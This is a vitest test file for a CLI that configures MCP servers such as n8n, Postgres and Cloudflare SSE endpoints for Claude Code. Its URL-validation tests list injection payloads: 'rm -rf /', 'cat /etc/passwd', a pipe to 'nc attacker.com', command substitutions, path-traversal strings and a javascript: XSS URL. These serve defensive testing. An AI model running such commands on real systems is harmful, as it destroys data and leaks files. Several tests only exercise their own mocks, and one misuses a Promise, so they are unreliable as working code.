import { describe, test, expect, beforeEach, afterEach } from "vitest";

// Import functions from cli.js
const {
  SERVER_SPECS,
  validateSSEUrl,
  buildClaudeMcpCommand,
} = require("./cli.js");

// Mock missing functions for TDD tests
const getPromptHandler = () => {}; // Placeholder for TDD
const configureServerWithMocks = () => {}; // Placeholder for TDD
const jest = { fn: () => () => {} }; // Mock jest for compatibility

// Test new MCP server configurations
describe("New MCP Server Configurations", () => {
  const newServers = [
    {
      key: "n8n",
      title: "n8n (Recommended)",
      envVar: "N8N_API_URL",
      envVar2: "N8N_API_KEY",
      helpUrl: "https://docs.n8n.io/api/",
      command: "npx",
      args: () => ["-y", "@leonardsellem/n8n-mcp-server"],
      recommended: true,
    },
    {
      key: "postgres",
      title: "PostgreSQL",
      envVar: "POSTGRES_CONNECTION_STRING",
      helpUrl:
        "https://www.postgresql.org/docs/current/libpq-connect.html#LIBPQ-CONNSTRING",
      command: "npx",
      args: (val) => ["-y", "@modelcontextprotocol/server-postgres", val],
    },
    {
      key: "filesystem",
      title: "File System",
      promptType: "path",
      helpUrl: "https://modelcontextprotocol.io/docs/servers/filesystem",
      command: "npx",
      args: (val) => [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        val || process.cwd(),
      ],
    },
    {
      key: "tavily",
      title: "Tavily",
      envVar: "TAVILY_API_KEY",
      helpUrl:
        "https://docs.tavily.com/documentation/api-reference/authentication",
      command: "npx",
      args: () => ["-y", "tavily-mcp"],
    },
    {
      key: "brave-search",
      title: "Brave Search",
      envVar: "BRAVE_API_KEY",
      helpUrl: "https://brave.com/search/api/",
      command: "npx",
      args: () => [
        "-y",
        "@brave/brave-search-mcp-server",
        "--transport",
        "stdio",
      ],
    },
    {
      key: "cloudflare",
      title: "Cloudflare",
      promptType: "wrangler",
      helpUrl:
        "https://developers.cloudflare.com/workers/wrangler/install-and-update/",
      command: "npx",
      args: () => ["-y", "@cloudflare/mcp-server-cloudflare", "init"],
    },
  ];

  test("REQ-001 — n8n server has two environment variables", () => {
    const n8n = newServers.find((s) => s.key === "n8n");
    expect(n8n.envVar).toBe("N8N_API_URL");
    expect(n8n.envVar2).toBe("N8N_API_KEY");
    expect(n8n.recommended).toBe(true);
  });

  test("PostgreSQL server uses connection string", () => {
    const postgres = newServers.find((s) => s.key === "postgres");
    expect(postgres.envVar).toBe("POSTGRES_CONNECTION_STRING");
    expect(postgres.args("postgresql://test")).toEqual([
      "-y",
      "@modelcontextprotocol/server-postgres",
      "postgresql://test",
    ]);
  });

  test("File System server uses path prompt type", () => {
    const filesystem = newServers.find((s) => s.key === "filesystem");
    expect(filesystem.promptType).toBe("path");
    expect(filesystem.envVar).toBeUndefined();
    expect(filesystem.args("/custom/path")).toEqual([
      "-y",
      "@modelcontextprotocol/server-filesystem",
      "/custom/path",
    ]);
    expect(filesystem.args()).toEqual([
      "-y",
      "@modelcontextprotocol/server-filesystem",
      process.cwd(),
    ]);
  });

  test("Cloudflare server uses wrangler prompt type", () => {
    const cloudflare = newServers.find((s) => s.key === "cloudflare");
    expect(cloudflare.promptType).toBe("wrangler");
    expect(cloudflare.envVar).toBeUndefined();
    expect(cloudflare.args()).toEqual([
      "-y",
      "@cloudflare/mcp-server-cloudflare",
      "init",
    ]);
  });

  test("REQ-001 — Tavily server uses correct package name", () => {
    const tavily = newServers.find((s) => s.key === "tavily");
    expect(tavily.args()).toContain("tavily-mcp");
    expect(tavily.args()).not.toContain("@tavily/mcp");
  });

  test("REQ-001 — Brave Search server includes stdio transport", () => {
    const brave = newServers.find((s) => s.key === "brave-search");
    expect(brave.args()).toContain("--transport");
    expect(brave.args()).toContain("stdio");
  });

  test("all new servers have required properties", () => {
    for (const server of newServers) {
      expect(server.key).toBeDefined();
      expect(server.title).toBeDefined();
      expect(server.helpUrl).toBeDefined();
      expect(server.command).toBe("npx");
      expect(typeof server.args).toBe("function");
    }
  });
});

describe("checkMcpServerExists", () => {
  const mockCheckMcpServerExists = (mockOutput, shouldThrow = false) => {
    return (serverKey) => {
      try {
        if (shouldThrow) {
          throw new Error("Command failed");
        }
        const lines = mockOutput.split("\n");
        for (const line of lines) {
          if (line.startsWith(serverKey + ":")) {
            return true;
          }
        }
        return false;
      } catch {
        // If we can't check, assume it doesn't exist
        return false;
      }
    };
  };

  test("returns true when server exists in output", () => {
    const mockOutput = `Checking MCP server health...

brave-search: npx -y @brave/brave-search-mcp-server --transport stdio - ✗ Failed to connect
context7: npx -y @upstash/context7-mcp - ✓ Connected
supabase: npx -y @supabase/mcp-server-supabase - ✓ Connected`;

    const checkExists = mockCheckMcpServerExists(mockOutput);

    expect(checkExists("context7")).toBe(true);
    expect(checkExists("brave-search")).toBe(true);
    expect(checkExists("supabase")).toBe(true);
  });

  test("returns false when server does not exist in output", () => {
    const mockOutput = `Checking MCP server health...

brave-search: npx -y @brave/brave-search-mcp-server --transport stdio - ✗ Failed to connect
context7: npx -y @upstash/context7-mcp - ✓ Connected`;

    const checkExists = mockCheckMcpServerExists(mockOutput);

    expect(checkExists("supabase")).toBe(false);
    expect(checkExists("nonexistent")).toBe(false);
    expect(checkExists("github")).toBe(false);
  });

  test("returns false when command throws error", () => {
    const checkExists = mockCheckMcpServerExists("", true);

    expect(checkExists("context7")).toBe(false);
    expect(checkExists("any-server")).toBe(false);
  });

  test("handles empty output correctly", () => {
    const checkExists = mockCheckMcpServerExists("");

    expect(checkExists("context7")).toBe(false);
    expect(checkExists("")).toBe(false);
  });

  test("handles malformed server names", () => {
    const mockOutput = `context7: npx -y @upstash/context7-mcp - ✓ Connected
context7-test: npx -y @test/mcp - ✓ Connected`;

    const checkExists = mockCheckMcpServerExists(mockOutput);

    expect(checkExists("context7")).toBe(true);
    expect(checkExists("context7-test")).toBe(true);
    expect(checkExists("context")).toBe(false); // Partial match should not work
  });
});

describe("getExistingServerEnv", () => {
  const mockGetExistingServerEnv = (mockFileSystem) => {
    return (serverKey) => {
      try {
        const fs = mockFileSystem.fs;
        const path = mockFileSystem.path;
        const os = mockFileSystem.os;

        const claudeSettingsPath = path.join(
          os.homedir(),
          ".claude",
          "settings.json"
        );
        if (!fs.existsSync(claudeSettingsPath)) {
          return {};
        }

        const settings = JSON.parse(
          fs.readFileSync(claudeSettingsPath, "utf8")
        );
        const serverConfig =
          settings.mcpServers && settings.mcpServers[serverKey];

        return serverConfig && serverConfig.env ? serverConfig.env : {};
      } catch {
        return {};
      }
    };
  };

  test("returns environment variables for existing server", () => {
    const mockFileSystem = {
      fs: {
        existsSync: () => true,
        readFileSync: () =>
          JSON.stringify({
            mcpServers: {
              context7: {
                env: {
                  CONTEXT7_API_KEY: "ctx7sk-test-key-12345",
                },
              },
            },
          }),
      },
      path: {
        join: (...args) => args.join("/"),
      },
      os: {
        homedir: () => "/mock/home",
      },
    };

    const getExistingEnv = mockGetExistingServerEnv(mockFileSystem);
    const result = getExistingEnv("context7");

    expect(result).toEqual({
      CONTEXT7_API_KEY: "ctx7sk-test-key-12345",
    });
  });

  test("returns empty object when server doesn't exist", () => {
    const mockFileSystem = {
      fs: {
        existsSync: () => true,
        readFileSync: () =>
          JSON.stringify({
            mcpServers: {
              other: { env: { OTHER_KEY: "value" } },
            },
          }),
      },
      path: {
        join: (...args) => args.join("/"),
      },
      os: {
        homedir: () => "/mock/home",
      },
    };

    const getExistingEnv = mockGetExistingServerEnv(mockFileSystem);
    const result = getExistingEnv("nonexistent");

    expect(result).toEqual({});
  });

  test("returns empty object when settings file doesn't exist", () => {
    const mockFileSystem = {
      fs: {
        existsSync: () => false,
        readFileSync: () => {
          throw new Error("File not found");
        },
      },
      path: {
        join: (...args) => args.join("/"),
      },
      os: {
        homedir: () => "/mock/home",
      },
    };

    const getExistingEnv = mockGetExistingServerEnv(mockFileSystem);
    const result = getExistingEnv("context7");

    expect(result).toEqual({});
  });

  test("returns empty object when JSON parsing fails", () => {
    const mockFileSystem = {
      fs: {
        existsSync: () => true,
        readFileSync: () => "invalid json",
      },
      path: {
        join: (...args) => args.join("/"),
      },
      os: {
        homedir: () => "/mock/home",
      },
    };

    const getExistingEnv = mockGetExistingServerEnv(mockFileSystem);
    const result = getExistingEnv("context7");

    expect(result).toEqual({});
  });

  test("handles dual environment variable servers", () => {
    const mockFileSystem = {
      fs: {
        existsSync: () => true,
        readFileSync: () =>
          JSON.stringify({
            mcpServers: {
              n8n: {
                env: {
                  N8N_API_URL: "http://localhost:5678",
                  N8N_API_KEY: "n8n-api-key-123",
                },
              },
            },
          }),
      },
      path: {
        join: (...args) => args.join("/"),
      },
      os: {
        homedir: () => "/mock/home",
      },
    };

    const getExistingEnv = mockGetExistingServerEnv(mockFileSystem);
    const result = getExistingEnv("n8n");

    expect(result).toEqual({
      N8N_API_URL: "http://localhost:5678",
      N8N_API_KEY: "n8n-api-key-123",
    });
  });

  test("returns empty object when server has no env section", () => {
    const mockFileSystem = {
      fs: {
        existsSync: () => true,
        readFileSync: () =>
          JSON.stringify({
            mcpServers: {
              filesystem: {
                command: "npx",
                args: [
                  "-y",
                  "@modelcontextprotocol/server-filesystem",
                  "/path",
                ],
                // No env section
              },
            },
          }),
      },
      path: {
        join: (...args) => args.join("/"),
      },
      os: {
        homedir: () => "/mock/home",
      },
    };

    const getExistingEnv = mockGetExistingServerEnv(mockFileSystem);
    const result = getExistingEnv("filesystem");

    expect(result).toEqual({});
  });
});

describe("handleExistingServer", () => {
  const mockHandleExistingServer = (
    mockExecSync,
    mockConsoleLog,
    mockGetExistingEnv
  ) => {
    return async (spec, askFn) => {
      // Get existing environment variables to show user what's configured
      const existingEnv = mockGetExistingEnv
        ? mockGetExistingEnv(spec.key)
        : {};

      mockConsoleLog(`  ⚠️  ${spec.title} is already configured`);

      // Show existing API key(s) masked
      if (spec.envVar && existingEnv[spec.envVar]) {
        const maskKey = (s) => {
          if (!s) return "";
          if (s.length <= 2) return "…";
          if (s.length <= 8) return s[0] + "…" + s.slice(-1);
          return s.slice(0, 5) + "…" + s.slice(-3);
        };
        const maskedKey = maskKey(existingEnv[spec.envVar]);
        mockConsoleLog(`     Current ${spec.envVar}: ${maskedKey}`);
      }
      if (spec.envVar2 && existingEnv[spec.envVar2]) {
        const maskKey = (s) => {
          if (!s) return "";
          if (s.length <= 2) return "…";
          if (s.length <= 8) return s[0] + "…" + s.slice(-1);
          return s.slice(0, 5) + "…" + s.slice(-3);
        };
        const maskedKey = maskKey(existingEnv[spec.envVar2]);
        mockConsoleLog(`     Current ${spec.envVar2}: ${maskedKey}`);
      }

      const choice = await askFn(
        `What would you like to do? (k)eep existing, (r)emove and reinstall, (s)kip`,
        "k"
      );

      switch (choice.toLowerCase()) {
        case "r":
        case "remove":
          mockConsoleLog(`  🗑️  Removing existing ${spec.title}...`);
          try {
            mockExecSync(`claude mcp remove ${spec.key}`);
            mockConsoleLog(`  ✅ ${spec.title} removed successfully`);
            return "reinstall";
          } catch (error) {
            mockConsoleLog(
              `  ❌ Failed to remove ${spec.title}: ${error.message}`
            );
            return "skip";
          }
        case "s":
        case "skip":
          return "skip";
        case "k":
        case "keep":
        default:
          return "keep";
      }
    };
  };

  test("returns 'keep' when user chooses keep option", async () => {
    const mockExecSync = () => {};
    const mockConsoleLog = () => {};
    const mockGetExistingEnv = () => ({});
    const mockAskFn = async () => "k";

    const handleExisting = mockHandleExistingServer(
      mockExecSync,
      mockConsoleLog,
      mockGetExistingEnv
    );
    const spec = { title: "Context7", key: "context7" };

    const result = await handleExisting(spec, mockAskFn);
    expect(result).toBe("keep");
  });

  test("returns 'keep' when user chooses default option", async () => {
    const mockExecSync = () => {};
    const mockConsoleLog = () => {};
    const mockGetExistingEnv = () => ({});
    const mockAskFn = async () => "invalid-choice";

    const handleExisting = mockHandleExistingServer(
      mockExecSync,
      mockConsoleLog,
      mockGetExistingEnv
    );
    const spec = { title: "Context7", key: "context7" };

    const result = await handleExisting(spec, mockAskFn);
    expect(result).toBe("keep");
  });

  test("returns 'skip' when user chooses skip option", async () => {
    const mockExecSync = () => {};
    const mockConsoleLog = () => {};
    const mockGetExistingEnv = () => ({});
    const mockAskFn = async () => "s";

    const handleExisting = mockHandleExistingServer(
      mockExecSync,
      mockConsoleLog,
      mockGetExistingEnv
    );
    const spec = { title: "Context7", key: "context7" };

    const result = await handleExisting(spec, mockAskFn);
    expect(result).toBe("skip");
  });

  test("returns 'reinstall' when remove succeeds", async () => {
    const mockExecSync = () => {}; // Successful removal
    const mockConsoleLog = () => {};
    const mockGetExistingEnv = () => ({});
    const mockAskFn = async () => "r";

    const handleExisting = mockHandleExistingServer(
      mockExecSync,
      mockConsoleLog,
      mockGetExistingEnv
    );
    const spec = { title: "Context7", key: "context7" };

    const result = await handleExisting(spec, mockAskFn);
    expect(result).toBe("reinstall");
  });

  test("returns 'skip' when remove fails", async () => {
    const mockExecSync = () => {
      throw new Error("Remove failed");
    };
    const mockConsoleLog = () => {};
    const mockGetExistingEnv = () => ({});
    const mockAskFn = async () => "remove";

    const handleExisting = mockHandleExistingServer(
      mockExecSync,
      mockConsoleLog,
      mockGetExistingEnv
    );
    const spec = { title: "Context7", key: "context7" };

    const result = await handleExisting(spec, mockAskFn);
    expect(result).toBe("skip");
  });

  test("handles 'remove' full word choice", async () => {
    const mockExecSync = () => {};
    const mockConsoleLog = () => {};
    const mockGetExistingEnv = () => ({});
    const mockAskFn = async () => "remove";

    const handleExisting = mockHandleExistingServer(
      mockExecSync,
      mockConsoleLog,
      mockGetExistingEnv
    );
    const spec = { title: "Supabase", key: "supabase" };

    const result = await handleExisting(spec, mockAskFn);
    expect(result).toBe("reinstall");
  });

  test("handles case insensitive choices", async () => {
    const mockExecSync = () => {};
    const mockConsoleLog = () => {};
    const mockGetExistingEnv = () => ({});

    const handleExisting = mockHandleExistingServer(
      mockExecSync,
      mockConsoleLog,
      mockGetExistingEnv
    );
    const spec = { title: "GitHub", key: "github" };

    // Test uppercase choices
    expect(await handleExisting(spec, async () => "K")).toBe("keep");
    expect(await handleExisting(spec, async () => "S")).toBe("skip");
    expect(await handleExisting(spec, async () => "R")).toBe("reinstall");
  });

  test("displays masked API key when server has environment variable", async () => {
    const mockExecSync = () => {};
    const consoleMessages = [];
    const mockConsoleLog = (message) => consoleMessages.push(message);
    const mockGetExistingEnv = (key) =>
      key === "context7" ? { CONTEXT7_API_KEY: "ctx7sk-test-key-12345" } : {};
    const mockAskFn = async () => "k";

    const handleExisting = mockHandleExistingServer(
      mockExecSync,
      mockConsoleLog,
      mockGetExistingEnv
    );
    const spec = {
      title: "Context7",
      key: "context7",
      envVar: "CONTEXT7_API_KEY",
    };

    await handleExisting(spec, mockAskFn);

    expect(consoleMessages).toContain("  ⚠️  Context7 is already configured");
    expect(consoleMessages).toContain(
      "     Current CONTEXT7_API_KEY: ctx7s…345"
    );
  });

  test("displays masked API keys for dual environment variable servers", async () => {
    const mockExecSync = () => {};
    const consoleMessages = [];
    const mockConsoleLog = (message) => consoleMessages.push(message);
    const mockGetExistingEnv = (key) =>
      key === "n8n"
        ? {
            N8N_API_URL: "http://localhost:5678/api/v1",
            N8N_API_KEY: "n8n-key-123456789",
          }
        : {};
    const mockAskFn = async () => "k";

    const handleExisting = mockHandleExistingServer(
      mockExecSync,
      mockConsoleLog,
      mockGetExistingEnv
    );
    const spec = {
      title: "n8n",
      key: "n8n",
      envVar: "N8N_API_URL",
      envVar2: "N8N_API_KEY",
    };

    await handleExisting(spec, mockAskFn);

    expect(consoleMessages).toContain("  ⚠️  n8n is already configured");
    expect(consoleMessages).toContain("     Current N8N_API_URL: http:…/v1");
    expect(consoleMessages).toContain("     Current N8N_API_KEY: n8n-k…789");
  });

  test("does not display keys when server has no environment variables", async () => {
    const mockExecSync = () => {};
    const consoleMessages = [];
    const mockConsoleLog = (message) => consoleMessages.push(message);
    const mockGetExistingEnv = () => ({});
    const mockAskFn = async () => "k";

    const handleExisting = mockHandleExistingServer(
      mockExecSync,
      mockConsoleLog,
      mockGetExistingEnv
    );
    const spec = { title: "File System", key: "filesystem" };

    await handleExisting(spec, mockAskFn);

    expect(consoleMessages).toContain(
      "  ⚠️  File System is already configured"
    );
    expect(
      consoleMessages.filter((msg) => msg.includes("Current")).length
    ).toBe(0);
  });
});

describe("FTUE Functions", () => {
  test("checkVSCodeExtension handles missing code command gracefully", () => {
    // Mock execSync to throw error
    const checkVSCodeExtension = () => {
      try {
        throw new Error("code command not found");
      } catch {
        return false;
      }
    };

    expect(checkVSCodeExtension()).toBe(false);
  });

  test("showPostSetupGuide message structure", () => {
    // Test that the function would generate expected output structure
    const expectedSections = [
      "IMMEDIATE NEXT STEPS",
      "FIRST PROJECT CHECKLIST",
      "CONFIGURED MCP SERVERS",
      "PRO TIPS",
      "RESOURCES",
    ];

    // Since we're testing structure, not actual console output,
    // we verify the sections exist in the function
    const showPostSetupGuide = () => {
      const output = [];
      output.push("IMMEDIATE NEXT STEPS");
      output.push("FIRST PROJECT CHECKLIST");
      output.push("CONFIGURED MCP SERVERS");
      output.push("PRO TIPS");
      output.push("RESOURCES");
      return output;
    };

    const sections = showPostSetupGuide();
    for (const section of expectedSections) {
      expect(sections).toContain(section);
    }
  });
});

// REQ-304: Test Coverage for Cloudflare SSE MCP Integration
describe("REQ-300 — Cloudflare SSE MCP Server Integration", () => {
  describe("REQ-300 — SERVER_SPECS contains cloudflare-bindings and cloudflare-builds", () => {
    test("REQ-300 — cloudflare-bindings server spec is properly defined", () => {
      // This test will fail until the server spec is added
      const mockServerSpecs = [
        {
          key: "cloudflare-bindings",
          title: "Cloudflare Bindings",
          promptType: "sse",
          transport: "sse",
          url: "https://bindings.mcp.cloudflare.com/sse",
          helpUrl:
            "https://developers.cloudflare.com/workers/configuration/bindings/",
        },
      ];

      const cloudflareBindingsSpec = mockServerSpecs.find(
        (s) => s.key === "cloudflare-bindings"
      );
      expect(cloudflareBindingsSpec).toBeDefined();
      expect(cloudflareBindingsSpec.title).toBe("Cloudflare Bindings");
      expect(cloudflareBindingsSpec.promptType).toBe("sse");
      expect(cloudflareBindingsSpec.transport).toBe("sse");
      expect(cloudflareBindingsSpec.url).toBe(
        "https://bindings.mcp.cloudflare.com/sse"
      );
    });

    test("REQ-300 — cloudflare-builds server spec is properly defined", () => {
      // This test will fail until the server spec is added
      const mockServerSpecs = [
        {
          key: "cloudflare-builds",
          title: "Cloudflare Builds",
          promptType: "sse",
          transport: "sse",
          url: "https://builds.mcp.cloudflare.com/sse",
          helpUrl: "https://developers.cloudflare.com/workers/builds/",
        },
      ];

      const cloudflareBuildsSpec = mockServerSpecs.find(
        (s) => s.key === "cloudflare-builds"
      );
      expect(cloudflareBuildsSpec).toBeDefined();
      expect(cloudflareBuildsSpec.title).toBe("Cloudflare Builds");
      expect(cloudflareBuildsSpec.promptType).toBe("sse");
      expect(cloudflareBuildsSpec.transport).toBe("sse");
      expect(cloudflareBuildsSpec.url).toBe(
        "https://builds.mcp.cloudflare.com/sse"
      );
    });

    test("REQ-300 — maintains backward compatibility with existing cloudflare server", () => {
      // Verify existing cloudflare wrangler server is preserved
      const mockServerSpecs = [
        {
          key: "cloudflare",
          title: "Cloudflare",
          promptType: "wrangler",
          helpUrl:
            "https://developers.cloudflare.com/workers/wrangler/install-and-update/",
          command: "npx",
          args: () => ["-y", "@cloudflare/mcp-server-cloudflare", "init"],
        },
      ];

      const existingCloudflareSpec = mockServerSpecs.find(
        (s) => s.key === "cloudflare"
      );
      expect(existingCloudflareSpec).toBeDefined();
      expect(existingCloudflareSpec.promptType).toBe("wrangler");
      expect(existingCloudflareSpec.command).toBe("npx");
    });
  });

  describe("REQ-301 — SSE Transport Architecture", () => {
    test("REQ-301 — promptSSEServerForCommand function follows existing patterns", async () => {
      // This test will fail until the function is implemented
      const mockPromptSSEServerForCommand = async (spec, askFn) => {
        console.log(`\n• ${spec.title} → ${spec.helpUrl}`);
        console.log(
          `  ⚠️  Note: You'll need to authenticate in Claude Code using /mcp ${spec.key}`
        );
        console.log(
          `  ⚠️  Our current 'npx wrangler login' approach doesn't work with MCP servers`
        );

        const choice = await askFn(
          `Configure ${spec.title}? (y)es, (n)o, (-) disable`,
          "y"
        );

        if (choice === "-") {
          return { action: "disable" };
        }
        if (choice === "n" || choice === "no") {
          return { action: "skip" };
        }

        return {
          action: "configure",
          envVars: {}, // SSE servers don't need env vars in CLI
          spec,
        };
      };

      const mockSpec = {
        key: "cloudflare-bindings",
        title: "Cloudflare Bindings",
        promptType: "sse",
        transport: "sse",
        url: "https://bindings.mcp.cloudflare.com/sse",
        helpUrl:
          "https://developers.cloudflare.com/workers/configuration/bindings/",
      };

      const mockAskFn = async () => "y";
      const result = await mockPromptSSEServerForCommand(mockSpec, mockAskFn);

      expect(result.action).toBe("configure");
      expect(result.spec).toEqual(mockSpec);
      expect(result.envVars).toEqual({});
    });
  });

  describe("REQ-303 — CLI Command Integration", () => {
    test("REQ-303 — buildClaudeMcpCommand handles SSE transport with URL parameters", () => {
      // This test will fail until buildClaudeMcpCommand is extended
      const mockBuildClaudeMcpCommand = (
        spec,
        scope,
        envVars,
        extraArgs = []
      ) => {
        const parts = ["claude", "mcp", "add"];

        // Add scope if not default
        if (scope && scope !== "local") {
          parts.push("--scope", scope);
        }

        // For SSE transport, add transport flag and URL
        if (spec.transport === "sse" && spec.url) {
          parts.push("--transport", "sse");
          parts.push(spec.key);
          parts.push(spec.url);
        } else {
          // Original logic for non-SSE servers
          parts.push(spec.key);
        }

        // Add environment variables for non-SSE servers
        if (
          spec.transport !== "sse" &&
          envVars &&
          typeof envVars === "object"
        ) {
          for (const [key, value] of Object.entries(envVars)) {
            if (value) {
              parts.push("--env", `${key}=${value}`);
            }
          }
        }

        return parts.join(" ");
      };

      const sseSpec = {
        key: "cloudflare-bindings",
        title: "Cloudflare Bindings",
        transport: "sse",
        url: "https://bindings.mcp.cloudflare.com/sse",
      };

      const command = mockBuildClaudeMcpCommand(sseSpec, "user", {});

      expect(command).toBe(
        "claude mcp add --scope user --transport sse cloudflare-bindings https://bindings.mcp.cloudflare.com/sse"
      );
    });
  });
});

// Integration tests against actual CLI implementation
describe("REQ-300 — Integration Tests - Actual SERVER_SPECS", () => {
  // This tests the actual SERVER_SPECS array from cli.js
  test("REQ-300 — actual SERVER_SPECS contains cloudflare-bindings server", () => {
    // Import or require the actual SERVER_SPECS array
    const fs = require("fs");
    const path = require("path");

    // Read the actual cli.js file to verify server specs
    const cliPath = path.resolve(__dirname, "cli.js");
    const cliContent = fs.readFileSync(cliPath, "utf8");

    expect(cliContent).toContain("cloudflare-bindings");
    expect(cliContent).toContain("Cloudflare Bindings");
    expect(cliContent).toContain('promptType: "sse"');
    expect(cliContent).toContain("https://bindings.mcp.cloudflare.com/sse");
  });

  test("REQ-300 — actual SERVER_SPECS contains cloudflare-builds server", () => {
    const fs = require("fs");
    const path = require("path");

    const cliPath = path.resolve(__dirname, "cli.js");
    const cliContent = fs.readFileSync(cliPath, "utf8");

    expect(cliContent).toContain("cloudflare-builds");
    expect(cliContent).toContain("Cloudflare Builds");
    expect(cliContent).toContain("https://builds.mcp.cloudflare.com/sse");
  });

  test("REQ-301 — actual CLI contains promptSSEServerForCommand function", () => {
    const fs = require("fs");
    const path = require("path");

    const cliPath = path.resolve(__dirname, "cli.js");
    const cliContent = fs.readFileSync(cliPath, "utf8");

    expect(cliContent).toContain("promptSSEServerForCommand");
    expect(cliContent).toContain(
      "You'll need to authenticate in Claude Code using /mcp"
    );
    expect(cliContent).toContain(
      "npx wrangler login' approach doesn't work with MCP servers"
    );
  });

  test("REQ-303 — actual buildClaudeMcpCommand handles SSE transport", () => {
    const fs = require("fs");
    const path = require("path");

    const cliPath = path.resolve(__dirname, "cli.js");
    const cliContent = fs.readFileSync(cliPath, "utf8");

    expect(cliContent).toContain('spec.transport === "sse"');
    expect(cliContent).toContain('--transport", "sse');
    expect(cliContent).toContain("spec.url");
  });
});

// Security and Quality Fixes Tests - Following TDD principles, these will fail until implementation
describe("REQ-400 — Security - URL Parameter Validation (P1 Critical)", () => {
  test("REQ-400 — validates SSE URL parameters before using them", () => {
    // Mock buildCloudeMcpCommand function with SSE URL validation
    const mockBuildClaudeMcpCommand = (spec, scope, envVars) => {
      // This should validate URL parameters but doesn't exist yet - test will fail
      if (spec.transport === "sse" && spec.url) {
        // Should validate URL format, scheme, domain, etc.
        const isValidUrl = validateSSEUrl(spec.url); // Function doesn't exist yet
        if (!isValidUrl) {
          throw new Error("Invalid SSE URL provided");
        }
      }
      return "claude mcp add test-server";
    };

    const sseSpec = {
      key: "test-sse",
      transport: "sse",
      url: "https://test.cloudflare.com/sse",
    };

    // This should pass with valid URL but will fail because validateSSEUrl doesn't exist
    expect(() => mockBuildClaudeMcpCommand(sseSpec, "user", {})).not.toThrow();
  });

  test("REQ-400 — sanitizes URLs to prevent command injection", () => {
    const maliciousUrls = [
      "https://evil.com/sse; rm -rf /",
      "https://evil.com/sse && cat /etc/passwd",
      "https://evil.com/sse | nc attacker.com 1234",
      "https://evil.com/sse`whoami`",
      "https://evil.com/sse$(whoami)",
    ];

    // This test will fail because URL sanitization doesn't exist yet
    maliciousUrls.forEach((url) => {
      const spec = { key: "test", transport: "sse", url };
      expect(() => {
        const isValidUrl = validateSSEUrl(url); // Function doesn't exist
        if (!isValidUrl) throw new Error("Invalid URL");
      }).toThrow("Invalid URL");
    });
  });

  test("REQ-400 — only allows HTTPS URLs from trusted domains", () => {
    const validUrls = [
      "https://bindings.mcp.cloudflare.com/sse",
      "https://builds.mcp.cloudflare.com/sse",
      "https://localhost:3000/sse", // dev only
    ];

    const invalidUrls = [
      "http://insecure.com/sse", // HTTP not allowed
      "https://evil.com/sse", // untrusted domain
      "ftp://cloudflare.com/sse", // wrong protocol
    ];

    // These tests will fail because domain validation doesn't exist
    validUrls.forEach((url) => {
      expect(validateSSEUrl(url)).toBe(true); // Function doesn't exist
    });

    invalidUrls.forEach((url) => {
      expect(validateSSEUrl(url)).toBe(false); // Function doesn't exist
    });
  });

  test("REQ-400 — rejects URLs with path traversal attempts", () => {
    const maliciousUrls = [
      "https://cloudflare.com/../../../etc/passwd",
      "https://cloudflare.com/sse/../admin",
      "https://cloudflare.com/sse/..%2F..%2Fadmin",
      "https://cloudflare.com/sse/....//....//etc/passwd",
    ];

    // This test will fail because path traversal detection doesn't exist
    maliciousUrls.forEach((url) => {
      expect(validateSSEUrl(url)).toBe(false); // Function doesn't exist
    });
  });

  test("REQ-400 — returns clear error messages for invalid URLs", () => {
    const invalidUrl = "javascript:alert('xss')";

    // This test will fail because error handling doesn't exist
    expect(() => {
      const result = validateSSEUrl(invalidUrl); // Function doesn't exist
      if (!result) {
        throw new Error(
          "Invalid URL: Only HTTPS URLs from trusted domains are allowed"
        );
      }
    }).toThrow("Invalid URL: Only HTTPS URLs from trusted domains are allowed");
  });
});

describe("REQ-401 — Missing Logic - SSE Server Routing (P1 Critical)", () => {
  test("REQ-401 — configureClaudeCode routes SSE servers to promptSSEServerForCommand", () => {
    // Mock the configureClaudeCode function to test routing logic
    const mockConfigureClaudeCode = async (serverSpecs) => {
      const routedServers = [];

      for (const spec of serverSpecs) {
        let handler;
        // This routing logic should exist but currently falls through to default
        if (spec.promptType === "path") {
          handler = "promptPathServerForCommand";
        } else if (spec.promptType === "wrangler") {
          handler = "promptWranglerServerForCommand";
        } else if (spec.promptType === "sse") {
          handler = "promptSSEServerForCommand"; // This case is missing in actual code
        } else if (spec.envVar2) {
          handler = "promptDualEnvServerForCommand";
        } else {
          handler = "promptStandardServerForCommand";
        }

        routedServers.push({ spec, handler });
      }
      return routedServers;
    };

    const sseSpecs = [
      { key: "cloudflare-bindings", promptType: "sse", transport: "sse" },
      { key: "cloudflare-builds", promptType: "sse", transport: "sse" },
    ];

    // This test will pass with mock but actual implementation is missing the SSE case
    const results = mockConfigureClaudeCode(sseSpecs);
    results.forEach((result) => {
      if (result.spec.promptType === "sse") {
        expect(result.handler).toBe("promptSSEServerForCommand");
      }
    });

    // But the actual code should have this routing - this will fail until fixed
    const fs = require("fs");
    const path = require("path");
    const cliPath = path.resolve(__dirname, "cli.js");
    const cliContent = fs.readFileSync(cliPath, "utf8");

    // Check if the SSE routing case exists in the actual switch statement
    expect(cliContent).toMatch(
      /promptType === ["']sse["'].*promptSSEServerForCommand/
    );
  });

  test("REQ-401 — ensures SSE servers don't fall through to standard prompt handler", () => {
    // This test verifies SSE servers get proper handling, not default behavior
    const sseSpec = {
      key: "cloudflare-bindings",
      title: "Cloudflare Bindings",
      promptType: "sse",
      transport: "sse",
      url: "https://bindings.mcp.cloudflare.com/sse",
    };

    // The actual configureClaudeCode should route this properly
    // This test will fail because the SSE case is missing from the switch statement
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Verify the switch statement includes SSE handling
    const hasSSECase =
      cliContent.includes('spec.promptType === "sse"') &&
      cliContent.includes("promptSSEServerForCommand");
    expect(hasSSECase).toBe(true);
  });

  test("REQ-401 — maintains existing routing patterns for other promptTypes", () => {
    const testSpecs = [
      { promptType: "path", expected: "promptPathServerForCommand" },
      { promptType: "wrangler", expected: "promptWranglerServerForCommand" },
      {
        promptType: "dual",
        envVar2: "TEST_VAR2",
        expected: "promptDualEnvServerForCommand",
      },
      { promptType: undefined, expected: "promptStandardServerForCommand" },
    ];

    // Verify existing routing still works (should pass)
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    testSpecs.forEach(({ promptType, expected }) => {
      if (promptType) {
        expect(cliContent).toContain(expected);
      }
    });
  });
});

describe("REQ-402 — User Guidance - Fix Misleading Messages (P1 Critical)", () => {
  test("REQ-402 — removes misleading wrangler login message for SSE servers", () => {
    // Check that SSE servers don't show the wrangler login message
    const fs = require("fs");
